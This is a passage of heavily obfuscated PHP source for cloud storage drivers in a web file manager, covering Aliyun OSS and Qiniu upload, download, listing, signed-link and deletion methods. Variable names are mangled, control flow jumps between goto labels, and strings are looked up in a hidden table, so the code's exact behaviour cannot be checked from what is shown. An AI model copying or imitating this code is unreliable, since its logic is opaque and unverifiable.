$f³·³àì°Ş[$DµÁÔÕ´Ó[214]], $DµÁÔÕ´Ó[226] => $bÑÌöÅÚ¦); goto CÙì¬ãÔÆ; b¸Ï¡ãÈ•ä: unset($f³·³àì°Ş[$DµÁÔÕ´Ó[215]], $f³·³àì°Ş[$DµÁÔÕ´Ó[219]]); $Dóó›âò‰˜ = $this->multiUploadAuthData($AŒ¹Ş“ù‰, $f³·³àì°Ş); if (empty($Dóó›âò‰˜)) { return !1; } goto B»•„¼¼ø¹; CÙì¬ãÔÆ: } public function download($b­©µÍİ§®, $fÓøšãöØĞ) { if ($this->isFolder($b­©µÍİ§®)) { return !1; } try { $CÉ±–ç²Ãß = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $fÓøšãöØĞ); $CÉ±–ç²Ãß = $this->trafficLimit($_SERVER[…Ò×–][105], $CÉ±–ç²Ãß); $this->client->getObject($this->bucket, $this->pathEncode($b­©µÍİ§®), $CÉ±–ç²Ãß); } catch (OSS\Core\OssException $A„ÌÇ•¯İÜ) { return !1; } return $fÓøšãöØĞ; } public function fileSubstr($CÀ’Íô°«Ğ, $dÃˆ¡¨ù©Ü = 0, $fØ•ˆïÜ = false) { if ($dÃˆ¡¨ù©Ü === -1) { $CÖÏîÀáÊ = array(); } else { if ($fØ•ˆïÜ === !1) { $E¸ˆÆ›ˆØ = $this->size($CÀ’Íô°«Ğ); } else { $E¸ˆÆ›ˆØ = $dÃˆ¡¨ù©Ü + $fØ•ˆïÜ - 1; } $CÖÏîÀáÊ = array(OSS\OssClient::OSS_RANGE => "{$dÃˆ¡¨ù©Ü}\55{$E¸ˆÆ›ˆØ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($CÀ’Íô°«Ğ), $CÖÏîÀáÊ); } catch (OSS\Core\OssException $dî§Ëİ§Û) { think_exception($dî§Ëİ§Û->getMessage()); return !1; } } private function trafficLimit($D‡óÎ”âò, $Dƒ§êñ«Ò = array()) { goto eŸ÷îÓéœ; c±î•’¸ºÆ: return $Dƒ§êñ«Ò; goto DÔòòîäÙ×; B‹ÍÚÛ—: if (!$bê»—Ñó‹) { return $Dƒ§êñ«Ò; } $bê»—Ñó‹ = $bê»—Ñó‹ < 819200 ? 819200 : ($bê»—Ñó‹ > 838860800 ? 838860800 : $bê»—Ñó‹); $Dƒ§êñ«Ò[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($bê»—Ñó‹); goto c±î•’¸ºÆ; eŸ÷îÓéœ: $dÜİ¾åå®¹ =& $_SERVER[…Ò×–]; if ($D‡óÎ”âò == $dÜİ¾åå®¹[1210] && $this->isUploadServer() || $D‡óÎ”âò == $dÜİ¾åå®¹[105] && $this->isFileOutServer()) { return $Dƒ§êñ«Ò; } $bê»—Ñó‹ = floatval($GLOBALS[$dÜİ¾åå®¹[6]][$dÜİ¾åå®¹[84]][$dÜİ¾åå®¹[103]][$D‡óÎ”âò]) * 1024 * 1024 * 8; goto B‹ÍÚÛ—; DÔòòîäÙ×: } public function link($AŠì¹™¼Ò•, $e…èñåÈÑ = array()) { $B©²„Ÿë =& $_SERVER[…Ò×–]; if (!$this->exist($AŠì¹™¼Ò•) || $this->isFolder($AŠì¹™¼Ò•)) { return !1; } try { $e…èñåÈÑ = $this->trafficLimit($B©²„Ÿë[105], $e…èñåÈÑ); $EàÜíì²–à = $this->client->signUrl($this->bucket, $this->pathEncode($AŠì¹™¼Ò•), 3600 * 12, $B©²„Ÿë[220], $e…èñåÈÑ); return $this->getCdnLink($EàÜíì²–à); } catch (OSS\Core\OssException $Aîæ¤òÛÍó) { return !1; } } public function fileOut($bÎÈÔŠ¡²º, $a†ÉÉ•·ä¼ = false, $E„ö›õÔÊó = false, $c®¬¼‰Ã•Ø = '') { goto aÃÌ²Ş’‰; céğï¦Ì™: $E„ö›õÔÊó = rawurlencode($E„ö›õÔÊó); $Dß²•Ÿ›ˆĞ = get_file_mime(get_path_ext($E„ö›õÔÊó)); if ($Dß²•Ÿ›ˆĞ == $BÈàãÚ„ŞÅ[205]) { return parent::fileOut($bÎÈÔŠ¡²º, $a†ÉÉ•·ä¼, $E„ö›õÔÊó, $c®¬¼‰Ã•Ø); } goto aòéß·‹´ñ; aòéß·‹´ñ: $a†ÉÉ•·ä¼ = $a†ÉÉ•·ä¼ ? $BÈàãÚ„ŞÅ[206] : $BÈàãÚ„ŞÅ[207]; $c‚„ªÜÎ‹² = array(OSS\OssClient::OSS_SUB_RESOURCE => $BÈàãÚ„ŞÅ[1221] . rawurlencode("{$a†ÉÉ•·ä¼}\x3b\146\x69\x6c\145\156\x61\x6d\x65\75{$E„ö›õÔÊó}")); $c‚„ªÜÎ‹²[OSS\OssClient::OSS_SUB_RESOURCE] .= $BÈàãÚ„ŞÅ[1222] . rawurlencode($Dß²•Ÿ›ˆĞ); goto A£Ì­Ó†Õ; aÃÌ²Ş’‰: $BÈàãÚ„ŞÅ =& $_SERVER[…Ò×–]; if ($this->isFileOutServer()) { return $this->fileOutServer($bÎÈÔŠ¡²º, $a†ÉÉ•·ä¼, $E„ö›õÔÊó, $c®¬¼‰Ã•Ø); } if (!$E„ö›õÔÊó) { $E„ö›õÔÊó = $this->pathThis($bÎÈÔŠ¡²º); } goto céğï¦Ì™; A£Ì­Ó†Õ: $D ˆ–× †Ñ = $this->link($bÎÈÔŠ¡²º, $c‚„ªÜÎ‹²); $this->fileOutLink($D ˆ–× †Ñ); goto B÷°Àäì¢; B÷°Àäì¢: } public function fileOutServer($eöğÂÂ†Ù, $bÁÌ¡‹ÅÕ = false, $Cìƒ»Ä‘ôù = false, $FÍë²ª´ğ‹ = '') { parent::fileOut($eöğÂÂ†Ù, $bÁÌ¡‹ÅÕ, $Cìƒ»Ä‘ôù, $FÍë²ª´ğ‹); } public function fileOutImage($CÏ‰µ¸Ğ¨, $b‰È‡Æ†Ò÷ = 250) { $c»ÑŞĞ‡ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[…Ò×–][1223] . $b‰È‡Æ†Ò÷); $d÷ô ¼ƒŞ = $this->link($CÏ‰µ¸Ğ¨, $c»ÑŞĞ‡); $this->fileOutLink($d÷ô ¼ƒŞ); } public function fileOutImageServer($Eïø…·…×„, $AÀÁæ¢¼Œ» = 250) { parent::fileOutImage($Eïø…·…×„, $AÀÁæ¢¼Œ»); } public function fileOutLink($c«Í‘ è·‚) { $bğô—ŠÊ =& $_SERVER[…Ò×–]; if (!$this->isCdnHost() && substr($c«Í‘ è·‚, 0, 7) == $bğô—ŠÊ[1125]) { $c«Í‘ è·‚ = $bğô—ŠÊ[1126] . substr($c«Í‘ è·‚, 7); } header($bğô—ŠÊ[156] . $c«Í‘ è·‚); die; } public function hashMd5($d‚ÄÅŞˆ¡¢, $D²‹â¬ïğº = '') { $A›£Û–¦•– =& $_SERVER[…Ò×–]; $eÜ³‚ì±ª‘ = $this->objectMeta($d‚ÄÅŞˆ¡¢); if (!$eÜ³‚ì±ª‘) { return $A›£Û–¦•–[33]; } if (!isset($eÜ³‚ì±ª‘[$A›£Û–¦•–[1197]]) && !empty($D²‹â¬ïğº)) { $C™²Î¦ƒ› = $this->updateObjMeta($d‚ÄÅŞˆ¡¢, array($A›£Û–¦•–[1197] => $D²‹â¬ïğº)); $eÜ³‚ì±ª‘[$A›£Û–¦•–[1197]] = $C™²Î¦ƒ› ? $D²‹â¬ïğº : $A›£Û–¦•–[33]; } return isset($eÜ³‚ì±ª‘[$A›£Û–¦•–[1197]]) ? strtolower($eÜ³‚ì±ª‘[$A›£Û–¦•–[1197]]) : $A›£Û–¦•–[33]; } public function size($d…ÓğïŒöø) { $AÌ°¾³îš– = $this->objectMeta($d…ÓğïŒöø); return $AÌ°¾³îš– ? $AÌ°¾³îš–[$_SERVER[…Ò×–][77]] : 0; } public function info($F·³¥×‡È¶) { if ($this->isFolder($F·³¥×‡È¶)) { return $this->folderInfo($F·³¥×‡È¶); } else { if ($this->isFile($F·³¥×‡È¶)) { return $this->fileInfo($F·³¥×‡È¶); } } return !1; } public function exist($DÖÇƒÜ†Õ) { return $this->isFile($DÖÇƒÜ†Õ) || $this->isFolder($DÖÇƒÜ†Õ); } public function isFile($EÉèƒ¼‡È) { return !$this->isFolder($EÉèƒ¼‡È) && $this->objectMeta($EÉèƒ¼‡È); } public function isFolder($f¿…ˆäÙÖ) { return $this->cacheMethod($_SERVER[…Ò×–][227], $f¿…ˆäÙÖ); } protected function objectMeta($aã¨ÕŞºÑ•) { return $this->cacheMethod($_SERVER[…Ò×–][228], $aã¨ÕŞºÑ•); } protected function _objectMeta($bä¤ñ® ˆ) { $AŒÂÔ×£‡® =& $_SERVER[…Ò×–]; try { $C£ŞÅî‘ãô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($bä¤ñ® ˆ)); } catch (OSS\Core\OssException $c­ãÁ’…Å“) { $C£ŞÅî‘ãô = !1; } if ($C£ŞÅî‘ãô) { $C£ŞÅî‘ãô[$AŒÂÔ×£‡®[77]] = intval($C£ŞÅî‘ãô[$AŒÂÔ×£‡®[1204]]); } return $C£ŞÅî‘ãô; } protected function _isFolder($AĞÛÕªÇ¸´) { $EÛğ—‹È =& $_SERVER[…Ò×–]; if ($AĞÛÕªÇ¸´ == $EÛğ—‹È[33] || $AĞÛÕªÇ¸´ == $EÛğ—‹È[8]) { return !0; } $fŠ¼Âª”øğ = array($EÛğ—‹È[1194] => $EÛğ—‹È[8], $EÛğ—‹È[190] => rtrim($AĞÛÕªÇ¸´, $EÛğ—‹È[8]) . $EÛğ—‹È[8], $EÛğ—‹È[1195] => 1, $EÛğ—‹È[1196] => $EÛğ—‹È[33]); $E»šÔÌø = $this->client->listObjects($this->bucket, $fŠ¼Âª”øğ); if ($E»šÔÌø->getObjectList() || $E»šÔÌø->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($eƒˆ‚…†‘) { parent::__construct(); require_once SDK_DIR . $_SERVER[…Ò×–][1224]; $this->_init($eƒˆ‚…†‘); } public function _init($B‹ˆè®¼ªå) { goto Dã­¥‡Îò¯; C×ŒÄ”¨ºÓ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto d‚ÖÛšëğÛ; aÍĞê¶­ÛÄ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto C×ŒÄ”¨ºÓ; Dã­¥‡Îò¯: $b¢ñÆ¤…§Ë =& $_SERVER[…Ò×–]; foreach ($B‹ˆè®¼ªå as $AŸï·÷”Ğò => $D¶Ã³™…É) { if (isset($this->{$AŸï·÷”Ğò})) { $this->{$AŸï·÷”Ğò} = $D¶Ã³™…É; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($b¢ñÆ¤…§Ë[1225] . LNG($b¢ñÆ¤…§Ë[1185])); } goto aÍĞê¶­ÛÄ; d‚ÖÛšëğÛ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($a¤ÏÔ’ ©, $e¶‚óª §‘ = '', $Aóå“®‚ = REPEAT_RENAME) { if ($this->setContent($a¤ÏÔ’ ©, $e¶‚óª §‘)) { return $this->getPathOuter($a¤ÏÔ’ ©); } return !1; } public function mkdir($b»ÎÓ£µ¾, $E°Ë²±‡Ò¢ = REPEAT_SKIP) { goto E‚Ëª›øî–; E•´‹ˆ’ª: $b»ÎÓ£µ¾ = $A‹é§Ğ÷‰Õ . $bÑà³ˆÍ‘ù[8]; $aŞ«­…èÙ = get_path_this($A‹é§Ğ÷‰Õ); $A­Ä±ô = $b»ÎÓ£µ¾ . $aŞ«­…èÙ; goto cª®êŒÔ–®; E‚Ëª›øî–: $bÑà³ˆÍ‘ù =& $_SERVER[…Ò×–]; $A‹é§Ğ÷‰Õ = trim($b»ÎÓ£µ¾, $bÑà³ˆÍ‘ù[8]); if ($this->_isFolder($A‹é§Ğ÷‰Õ)) { return $this->getPathOuter($A‹é§Ğ÷‰Õ); } goto E•´‹ˆ’ª; cª®êŒÔ–®: if (!$this->mkfile($A­Ä±ô)) { return !1; } if (!$this->moveFile($A­Ä±ô, $b»ÎÓ£µ¾)) { $this->delFile($A­Ä±ô); return !1; } return $this->getPathOuter($A‹é§Ğ÷‰Õ); goto a²º««½¡; a²º««½¡: } public function copyFile($b“¹åï¨, $CŒùƒå) { $B®å”ÎÙŒË = $this->bucketManager->copy($this->bucket, $b“¹åï¨, $this->bucket, $CŒùƒå, !0); return $B®å”ÎÙŒË ? !1 : $this->getPathOuter($CŒùƒå); } public function moveFile($Eò¶ ¸Œ¤Ò, $F¸Š¡×›Îñ) { $DÓ´ƒ¼‹Ÿ = $this->bucketManager->move($this->bucket, $Eò¶ ¸Œ¤Ò, $this->bucket, $F¸Š¡×›Îñ, !0); return $DÓ´ƒ¼‹Ÿ ? !1 : $this->getPathOuter($F¸Š¡×›Îñ); } public function delFile($eˆ‰›Àõ”Ä) { if (!$this->exist($eˆ‰›Àõ”Ä)) { return !0; } $BÄÉ‹¹Å£ = $this->bucketManager->delete($this->bucket, $eˆ‰›Àõ”Ä); return $BÄÉ‹¹Å£ ? !1 : !0; } public function delFolder($DÒ‰¢¥Æº¢) { goto a—ÀÒªÈà; F²î¸½¼Îá: return !0; goto D‹“¡£Šé‘; a—ÀÒªÈà: if (!$this->exist($DÒ‰¢¥Æº¢)) { return !0; } $d³¶®«‰À = $this->fileList($DÒ‰¢¥Æº¢); if (empty($d³¶®«‰À)) { return !0; } goto CØ¢‡ğ‚Û¹; CØ¢‡ğ‚Û¹: $C²µƒÓÜñ = 1000; if (count($d³¶®«‰À) <= $C²µƒÓÜñ) { return $this->qnDelObj($d³¶®«‰À) ? !1 : !0; } foreach (array_chunk($d³¶®«‰À, $C²µƒÓÜñ) as $fÃ—¶—„Ş) { $E¸ˆ¬¿Úä = $this->qnDelObj($fÃ—¶—„Ş); if ($E¸ˆ¬¿Úä) { return !1; } } goto F²î¸½¼Îá; D‹“¡£Šé‘: } private function qnDelObj($Aè¼ë‘ïäÂ) { $Bİ¥ÚÄÉŒã = $this->bucketManager->buildBatchDelete($this->bucket, $Aè¼ë‘ïäÂ); list($d’¹«•ÎŸ», $fÅ¤å°½…) = $this->bucketManager->batch($Bİ¥ÚÄÉŒã); return $fÅ¤å°½…; } private function fileList($bçŠë•ö½”, $aÄ÷—”ŸÉ¸ = 0) { goto C§ìÙ×¹ÌÇ; C§ìÙ×¹ÌÇ: $eµ†¹îëäÈ =& $_SERVER[…Ò×–]; $bçŠë•ö½” = trim($bçŠë•ö½”, $eµ†¹îëäÈ[8]); $D¼¬¼Â—‹« = empty($bçŠë•ö½”) ? $eµ†¹îëäÈ[33] : $bçŠë•ö½” . $eµ†¹îëäÈ[8]; goto eëÒïÒº§¥; fÓÌ÷âöñê: $D‹ƒ‡ñ¥ˆÓ = array(); while (!0) { list($e÷†®à›À, $C÷êÅÊ‚) = $this->bucketManager->listFiles($this->bucket, $D¼¬¼Â—‹«, $A»ÄºÈ¶ÊÕ, $cÌˆŠóĞé, $cÕÍ‡¾‹ë); if ($C÷êÅÊ‚) { return !1; } $A»ÄºÈ¶ÊÕ = array_key_exists($eµ†¹îëäÈ[1196], $e÷†®à›À) ? $A»ÄºÈ¶ÊÕ = $e÷†®à›À[$eµ†¹îëäÈ[1226]] : $eµ†¹îëäÈ[33]; foreach ($e÷†®à›À[$eµ†¹îëäÈ[1227]] as $a¦˜Ñî¿±) { $Aà‚¼‰£Š = $a¦˜Ñî¿±[$eµ†¹îëäÈ[89]]; if ($aÄ÷—”ŸÉ¸) { $Aà‚¼‰£Š = array($eµ†¹îëäÈ[28] => $Aà‚¼‰£Š, $eµ†¹îëäÈ[77] => $a¦˜Ñî¿±[$eµ†¹îëäÈ[1228]]); } $D‹ƒ‡ñ¥ˆÓ[] = $Aà‚¼‰£Š; } if ($A»ÄºÈ¶ÊÕ == $eµ†¹îëäÈ[33]) { break; } } return $D‹ƒ‡ñ¥ˆÓ; goto fŠƒ˜œ½í; eëÒïÒº§¥: $A»ÄºÈ¶ÊÕ = $eµ†¹îëäÈ[33]; $cÌˆŠóĞé = 1000; $cÕÍ‡¾‹ë = $eµ†¹îëäÈ[33]; goto fÓÌ÷âöñê; fŠƒ˜œ½í: } public function rename($FØòê™Ã², $cÜã¹“ŒØ°) { return $this->renameObject($FØòê™Ã², $cÜã¹“ŒØ°); } public function fileInfo($BÎ¶ÉƒÃäñ, $e¦Ãì²‡˜ = false, $AñæÍ¢®È„ = array()) { goto A±½¿¨¥»É; A±½¿¨¥»É: $AÒÔ¹øÕíŒ =& $_SERVER[…Ò×–]; if ($e¦Ãì²‡˜) { return array($AÒÔ¹øÕíŒ[28] => $this->pathThis($BÎ¶ÉƒÃäñ), $AÒÔ¹øÕíŒ[75] => $this->getPathOuter($AÒÔ¹øÕíŒ[8] . $BÎ¶ÉƒÃäñ), $AÒÔ¹øÕíŒ[29] => $AÒÔ¹øÕíŒ[171], $AÒÔ¹øÕíŒ[77] => isset($AñæÍ¢®È„[$AÒÔ¹øÕíŒ[1228]]) ? $AñæÍ¢®È„[$AÒÔ¹øÕíŒ[1228]] : 0, $AÒÔ¹øÕíŒ[165] => $this->ext($BÎ¶ÉƒÃäñ)); } $c…ñğÈ§‚ = array($AÒÔ¹øÕíŒ[28] => $this->pathThis($BÎ¶ÉƒÃäñ), $AÒÔ¹øÕíŒ[75] => $this->getPathOuter($AÒÔ¹øÕíŒ[8] . $BÎ¶ÉƒÃäñ), $AÒÔ¹øÕíŒ[29] => $AÒÔ¹øÕíŒ[171], $AÒÔ¹øÕíŒ[191] => 0, $AÒÔ¹øÕíŒ[107] => 0, $AÒÔ¹øÕíŒ[77] => 0, $AÒÔ¹øÕíŒ[165] => $this->ext($BÎ¶ÉƒÃäñ), $AÒÔ¹øÕíŒ[192] => !0, $AÒÔ¹øÕíŒ[193] => !0); goto E¾¿ ˜‰Å‰; dÉ…¾Æêë³: return $c…ñğÈ§‚; goto cÀ¢öìâ…; E¾¿ ˜‰Å‰: if (empty($AñæÍ¢®È„)) { $AñæÍ¢®È„ = $this->objectMeta($BÎ¶ÉƒÃäñ); if (!$AñæÍ¢®È„) { return $c…ñğÈ§‚; } } if (isset($AñæÍ¢®È„[$AÒÔ¹øÕíŒ[1229]])) { $c…ñğÈ§‚[$AÒÔ¹øÕíŒ[107]] = substr($AñæÍ¢®È„[$AÒÔ¹øÕíŒ[1229]] . $AÒÔ¹øÕíŒ[33], 0, 10); } if (isset($AñæÍ¢®È„[$AÒÔ¹øÕíŒ[1228]])) { $c…ñğÈ§‚[$AÒÔ¹øÕíŒ[77]] = $AñæÍ¢®È„[$AÒÔ¹øÕíŒ[1228]]; } goto dÉ…¾Æêë³; cÀ¢öìâ…: } public function folderInfo($eÇ±©“†éô, $FÚ¤Èë¬ŞÉ = false) { goto f†¡“äÑœÍ; fğáä¸¹»¹: $eÇ±©“†éô = rtrim($eÇ±©“†éô, $eœ±ƒŒ¸[8]) . $eœ±ƒŒ¸[8]; $fÜÏäª²Æó = $this->objectMeta($eÇ±©“†éô); if (isset($fÜÏäª²Æó[$eœ±ƒŒ¸[1229]])) { $E×ÁÒîïöÃ[$eœ±ƒŒ¸[107]] = substr($fÜÏäª²Æó[$eœ±ƒŒ¸[1229]] . $eœ±ƒŒ¸[33], 0, 10); } goto bïÌÈæËñ; f†¡“äÑœÍ: $eœ±ƒŒ¸ =& $_SERVER[…Ò×–]; if ($FÚ¤Èë¬ŞÉ) { return array($eœ±ƒŒ¸[28] => $this->pathThis($eÇ±©“†éô), $eœ±ƒŒ¸[75] => $this->getPathOuter($eœ±ƒŒ¸[8] . $eÇ±©“†éô), $eœ±ƒŒ¸[29] => $eœ±ƒŒ¸[76]); } $E×ÁÒîïöÃ = array($eœ±ƒŒ¸[28] => $this->pathThis($eÇ±©“†éô), $eœ±ƒŒ¸[75] => $this->getPathOuter($eœ±ƒŒ¸[8] . $eÇ±©“†éô), $eœ±ƒŒ¸[29] => $eœ±ƒŒ¸[76], $eœ±ƒŒ¸[191] => 0, $eœ±ƒŒ¸[107] => 0, $eœ±ƒŒ¸[1175] => !0, $eœ±ƒŒ¸[1176] => !0); goto fğáä¸¹»¹; bïÌÈæËñ: return $E×ÁÒîïöÃ; goto EÔ¤“‚ˆíÚ; EÔ¤“‚ˆíÚ: } public function listPath($CŞÂò¶º¯, $DŒ‰÷®™¬ = false) { goto BˆŸïöš«…; C¼ˆÁŸ÷Ó©: $aƒêÊš´ó— = $EÆ“Ğ¦Ì†ã[33]; $A‘¯âÙÙìß = 1000; $CáÎ¤œŒ£‘ = $EÆ“Ğ¦Ì†ã[8]; goto bÂî¥Âç; BˆŸïöš«…: $EÆ“Ğ¦Ì†ã =& $_SERVER[…Ò×–]; $CŞÂò¶º¯ = trim($CŞÂò¶º¯, $EÆ“Ğ¦Ì†ã[8]); $e™½ÀƒÄè = empty($CŞÂò¶º¯) ? $EÆ“Ğ¦Ì†ã[33] : $CŞÂò¶º¯ . $EÆ“Ğ¦Ì†ã[8]; goto C¼ˆÁŸ÷Ó©; bÂî¥Âç: $F²©·ñå  = $A»‡‰®ï¬Š = array(); while (!0) { list($D›‰ä‘ÉøÖ, $FèØ–šó) = $this->bucketManager->listFiles($this->bucket, $e™½ÀƒÄè, $aƒêÊš´ó—, $A‘¯âÙÙìß, $CáÎ¤œŒ£‘); if ($FèØ–šó) { return !1; } $aƒêÊš´ó— = array_key_exists($EÆ“Ğ¦Ì†ã[1196], $D›‰ä‘ÉøÖ) ? $aƒêÊš´ó— = $D›‰ä‘ÉøÖ[$EÆ“Ğ¦Ì†ã[1226]] : $EÆ“Ğ¦Ì†ã[33]; if (isset($D›‰ä‘ÉøÖ[$EÆ“Ğ¦Ì†ã[1230]])) { foreach ($D›‰ä‘ÉøÖ[$EÆ“Ğ¦Ì†ã[1230]] as $e‰…õŒß‹Á) { if ($e‰…õŒß‹Á == $e™½ÀƒÄè) { continue; } $F²©·ñå [] = $this->folderInfo($e‰…õŒß‹Á, $DŒ‰÷®™¬); } } if (isset($D›‰ä‘ÉøÖ[$EÆ“Ğ¦Ì†ã[1227]])) { foreach ($D›‰ä‘ÉøÖ[$EÆ“Ğ¦Ì†ã[1227]] as $fÜ˜¡éÛ) { if ($fÜ˜¡éÛ[$EÆ“Ğ¦Ì†ã[89]] == $e™½ÀƒÄè) { continue; } $A»‡‰®ï¬Š[] = $this->fileInfo($fÜ˜¡éÛ[$EÆ“Ğ¦Ì†ã[89]], $DŒ‰÷®™¬, $fÜ˜¡éÛ); } } if ($aƒêÊš´ó— == $EÆ“Ğ¦Ì†ã[33]) { break; } } return array($EÆ“Ğ¦Ì†ã[74] => $F²©·ñå , $EÆ“Ğ¦Ì†ã[73] => $A»‡‰®ï¬Š); goto aìïœ±•Ç; aìïœ±•Ç: } public function has($D°Şì¾ˆÊè, $e•ãâ«Ÿ¢œ = false, $f¾”„¢çÑô = true) { goto cîáï¾¨; cîáï¾¨: $eîáß×¾¯  =& $_SERVER[…Ò×–]; $D°Şì¾ˆÊè = trim($D°Şì¾ˆÊè, $eîáß×¾¯ [8]); $Dé¨ï©‡±£ = empty($D°Şì¾ˆÊè) ? $eîáß×¾¯ [33] : $D°Şì¾ˆÊè . $eîáß×¾¯ [8]; goto a¥™ÌÙöÔæ; a¥™ÌÙöÔæ: $CÖïè”“Ç = $eîáß×¾¯ [33]; $A“«îÛ§é = 1000; $AõæÚ–é†è = $eîáß×¾¯ [8]; goto F ïğš…; eÎÚÑ¡ğÄ…: if ($e•ãâ«Ÿ¢œ) { return array($eîáß×¾¯ [195] => $E‡µÒÂß¥, $eîáß×¾¯ [196] => $Cªñ–¹ôÆâ); } return !1; goto cÁœ‹Ğ¬íÈ; F ïğš…: $E‡µÒÂß¥ = 0; $Cªñ–¹ôÆâ = 0; while (!0) { list($Eàñ·™îØ§, $b¬ºìø´•Ü) = $this->bucketManager->listFiles($this->bucket, $Dé¨ï©‡±£, $CÖïè”“Ç, $A“«îÛ§é, $AõæÚ–é†è); if ($b¬ºìø´•Ü) { return !1; } $CÖïè”“Ç = array_key_exists($eîáß×¾¯ [1196], $Eàñ·™îØ§) ? $CÖïè”“Ç = $Eàñ·™îØ§[$eîáß×¾¯ [1226]] : $eîáß×¾¯ [33]; if ($e•ãâ«Ÿ¢œ) { if (!empty($Eàñ·™îØ§[$eîáß×¾¯ [1227]])) { $E‡µÒÂß¥ += count($Eàñ·™îØ§[$eîáß×¾¯ [1227]]); } if (!empty($Eàñ·™îØ§[$eîáß×¾¯ [1230]])) { $Cªñ–¹ôÆâ += count($Eàñ·™îØ§[$eîáß×¾¯ [1230]]); } if ($CÖïè”“Ç === $eîáß×¾¯ [33]) { break; } continue; } if ($f¾”„¢çÑô) { if (!empty($Eàñ·™îØ§[$eîáß×¾¯ [1227]])) { return !0; } } else { if (!empty($Eàñ·™îØ§[$eîáß×¾¯ [1230]])) { return !0; } } if ($CÖïè”“Ç == $eîáß×¾¯ [33]) { break; } } goto eÎÚÑ¡ğÄ…; cÁœ‹Ğ¬íÈ: } public function listAll($c–ŞòÑÖ) { $b¸åì•Ğ×½ =& $_SERVER[…Ò×–]; $bğôÕ‰ƒŸÑ = $this->fileList($c–ŞòÑÖ, 1); $fø¤š¨÷ÇÁ = array(); foreach ($bğôÕ‰ƒŸÑ as $b¶‹¹²í÷Ñ) { $fø¤š¨÷ÇÁ[$b¶‹¹²í÷Ñ[$b¸åì•Ğ×½[28]]] = $b¶‹¹²í÷Ñ[$b¸åì•Ğ×½[77]]; } return $this->listAllFiles($c–ŞòÑÖ, array_keys($fø¤š¨÷ÇÁ), $fø¤š¨÷ÇÁ); } public function canRead($BÚö¸·çŒˆ) { return $this->exist($BÚö¸·çŒˆ) ? !0 : !1; } public function canWrite($CŠó¢óòëŒ) { return $this->exist($CŠó¢óòëŒ) ? !0 : !1; } public function getContent($cáœîòì‚) { return $this->fileSubstr($cáœîòì‚, 0, -1); } public function setContent($D˜£ÃÊ¾¾ë, $a×ù’ò® = '') { $B³½›ÊƒÌÈ = $this->tempFile($this->pathThis($D˜£ÃÊ¾¾ë)); file_put_contents($B³½›ÊƒÌÈ, $a×ù’ò®); if ($this->upload($D˜£ÃÊ¾¾ë, $B³½›ÊƒÌÈ)) { $this->tempFileRemve($B³½›ÊƒÌÈ); return !0; } return !1; } public function refreshUrls($fö¢Ä÷ã×ê) { goto b¯²æëî¾; b¯²æëî¾: $C ğêÊ¸“â =& $_SERVER[…Ò×–]; $FµßĞ›¬‰ = array(); if (is_array($fö¢Ä÷ã×ê)) { foreach ($fö¢Ä÷ã×ê as $fÔˆÇğ¸ç) { $FµßĞ›¬‰[] = $this->link($fÔˆÇğ¸ç); } } else { $FµßĞ›¬‰[] = $this->link($fö¢Ä÷ã×ê); } goto bäŠÁõ©Íà; b»ó¨‰µó: return $e›ÜÉñõ§Š[$C ğêÊ¸“â[1231]] == $C ğêÊ¸“â[701] ? !0 : !1; goto fö„Œ¸Ë; bäŠÁõ©Íà: $cÇ‚Ş—”† = new Qiniu\Cdn\CdnManager($this->auth); list($e›ÜÉñõ§Š, $dªºœ•©Ìˆ) = $cÇ‚Ş—”†->refreshUrls($FµßĞ›¬‰); if ($dªºœ•©Ìˆ) { return !1; } goto b»ó¨‰µó; fö„Œ¸Ë: } public function fileSubstr($bù÷‚·÷¨, $BÀìŠ‘¿Ç, $aÀøå³ÌÊ¨) { $F¯£«ÁÚœ =& $_SERVER[…Ò×–]; if (!($B›—ÓîèÆ— = $this->link($bù÷‚·÷¨))) { return !1; } $BÇ¤òø„œ = !1; if ($aÀøå³ÌÊ¨ > 0) { $B½Ÿƒï›Œ™ = $BÀìŠ‘¿Ç + $aÀøå³ÌÊ¨ - 1; $BÇ¤òø„œ = array($F¯£«ÁÚœ[1232] . $BÀìŠ‘¿Ç . $F¯£«ÁÚœ[416] . $B½Ÿƒï›Œ™); } $DÃéñœÚĞÀ = url_request($B›—ÓîèÆ—, $F¯£«ÁÚœ[220], !1, $BÇ¤òø„œ); return $DÃéñœÚĞÀ[$F¯£«ÁÚœ[694]] ? $DÃéñœÚĞÀ[$F¯£«ÁÚœ[1045]] : !1; } public function upload($D†»¨…ìÙ , $eƒ‰•ƒõÑ, $f‹Ä´ÌóŞÁ = false, $cŸÉóÖÓº‡ = REPEAT_REPLACE) { $A‘Ñ¯À›Ğ = new Qiniu\Storage\UploadManager(); $d‰˜ØÔ¤šÉ = $this->auth->uploadToken($this->bucket, $D†»¨…ìÙ ); $b¦æê¥ÏÇ¦ = get_file_mime(get_path_ext($eƒ‰•ƒõÑ)); list($EĞœÕºî, $eïÎÅøØ²Ñ) = $A‘Ñ¯À›Ğ->putFile($d‰˜ØÔ¤šÉ, $D†»¨…ìÙ , $eƒ‰•ƒõÑ, null, $b¦æê¥ÏÇ¦); return $eïÎÅøØ²Ñ ? !1 : $this->getPathOuter($D†»¨…ìÙ ); } public function uploadFormData($eŸ…½ÙÓ¾¦, $B–”‰°ÂŸì = 3600) { return $this->uploadToken($eŸ…½ÙÓ¾¦, $B–”‰°ÂŸì); } public function multiUploadFormData($AØÎó™Øõ„, $fŠîÕ­ = 3600) { return $this->uploadToken($AØÎó™Øõ„, $fŠîÕ­); } private function uploadToken($e’šËì²•, $dí ¤ØËøğ = 3600) { goto d‚øšÚ”¦; d‚øšÚ”¦: $E•‡ï§» =& $_SERVER[…Ò×–]; $e…Ô÷†‡íØ = 